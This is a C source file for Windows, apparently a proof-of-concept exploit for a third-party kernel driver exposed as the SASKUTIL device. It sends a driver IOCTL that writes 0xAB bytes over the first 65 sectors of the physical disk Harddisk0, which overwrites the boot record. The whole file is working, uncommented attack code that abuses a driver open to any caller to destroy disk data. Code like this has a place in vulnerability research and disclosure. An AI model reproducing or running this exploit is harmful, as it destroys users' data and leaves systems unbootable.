#pragma warning(disable: 4005)

#include <windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include "ntos.h"

NTSTATUS CallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_opt_ PVOID InputBuffer,
    _In_opt_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult = FALSE;
    IO_STATUS_BLOCK ioStatus;

    return NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

}

#pragma pack(push, 1)
typedef struct _CALL_DRV {
    WCHAR DeviceName[2048];
    LARGE_INTEGER StartingOffset;       // +0x1000
    SIZE_T DataSize;                    // +0x1008
    PVOID DataPtr;                      // +0x1010
} CALL_DRV, * PCALL_DRV;
#pragma pack(pop)

ULONG u = FIELD_OFFSET(CALL_DRV, DataPtr);

#define SAS_DEVICE 0x9C40
#define IOCTL_SAS_CALLDRIVER CTL_CODE(SAS_DEVICE, 0x850, METHOD_BUFFERED, FILE_ANY_ACCESS)

int main()
{
    NTSTATUS ntStatus;
    CALL_DRV request;

    HANDLE deviceHandle = CreateFile(TEXT("\\\\.\\SASKUTIL"),
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (deviceHandle == INVALID_HANDLE_VALUE) {
        printf_s("[!] Unable to open device\r\n");
#ifndef _DEBUG
        return -1;
#endif
    }
    else {
        printf_s("[+] SASKUTIL device opened\r\n");
    }

    system("pause");

    WCHAR writeData[512];

    memset(&writeData, 0xAB, sizeof(writeData));
    RtlSecureZeroMemory(&request, sizeof(request));

    wcscpy_s(request.DeviceName, L"\\Device\\Harddisk0\\DR0");
    request.DataSize = sizeof(writeData);
    request.DataPtr = &writeData;

    for (ULONG i = 0; i < 65; i++) {

        request.StartingOffset.LowPart = (i * 512);

        ntStatus = CallDriver(deviceHandle,
            IOCTL_SAS_CALLDRIVER,
            &request,
            sizeof(CALL_DRV),
            NULL,
            0);

        printf_s("[+] CallDriver NTSTATUS 0x%lX\r\n", ntStatus);
    }

    CloseHandle(deviceHandle);
}
